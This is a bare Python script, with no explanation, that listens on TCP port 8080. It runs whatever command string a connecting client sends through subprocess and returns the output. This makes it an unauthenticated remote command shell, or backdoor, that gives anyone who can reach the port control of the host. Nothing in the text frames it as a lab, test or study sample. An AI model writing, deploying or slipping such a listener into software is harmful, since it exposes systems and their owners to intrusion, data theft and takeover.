import socket
import subprocess

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 8080
server_socket.bind(('', port))
server_socket.listen(1)

while True:
  conn, addr = server_socket.accept()
  comm = conn.recv(1024).decode()
  conn.send('Proccessing the query...'.encode())
  result = subprocess.run(comm.split(' '), stdout=subprocess.PIPE)
  conn.send(result.stdout)
  conn.send('Done!'.encode())
  conn.close()
